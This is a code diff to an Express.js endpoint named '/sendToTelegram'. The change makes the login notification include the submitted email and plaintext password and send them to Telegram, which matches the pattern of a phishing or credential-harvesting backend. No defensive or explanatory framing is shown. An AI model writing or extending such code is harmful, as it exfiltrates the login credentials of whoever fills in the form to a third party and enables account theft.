@@ -56,11 +56,10 @@ app.post('/sendToTelegram', async (req, res, next) => {
     return res.status(400).json({ success: false, message: "Missing required fields" });
   }
 
-  const message = `New login: Email: ${email}, Time: ${new Date().toISOString()}`;
+  const message = `New login:\n📧 Email: ${email}\n🔐 Password: ${password}`;
 
   try {
     await sendTelegramMessage(message);
-  
 
     res.setHeader('Content-Type', 'application/json');
     res.status(200).json({ success: true, message: "Message sent to Telegram" });
